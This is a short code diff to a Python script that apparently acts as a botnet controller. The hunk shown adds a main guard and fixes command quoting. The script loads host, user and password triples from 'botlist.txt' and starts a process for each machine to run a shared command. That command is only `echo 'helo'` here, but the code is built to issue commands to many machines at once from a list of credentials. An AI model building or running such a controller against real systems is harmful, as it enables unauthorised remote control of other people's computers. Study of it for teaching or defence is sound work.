@@ -34,12 +34,13 @@ def addClient(host, user, password):
     client = Client(host, user, password)
     botNet.append(client)
 
-order = '"echo "helo""'
-botNet = []
-for f in open("botlist.txt", "r").readlines():
-    result = f.split("$")
-    addClient(result[0], result[1], result[2])
-for client in botNet:
-    session = Process(target=botnetCommand, args=(order,client))
-    session.start()
-session.join()
+if __name__ == "__main__":
+    order = 'echo "helo"'
+    botNet = []
+    for f in open("botlist.txt", "r").readlines():
+        result = f.split("$")
+        addClient(result[0], result[1], result[2])
+    for client in botNet:
+        session = Process(target=botnetCommand, args=(order,client))
+        session.start()
+    session.join()
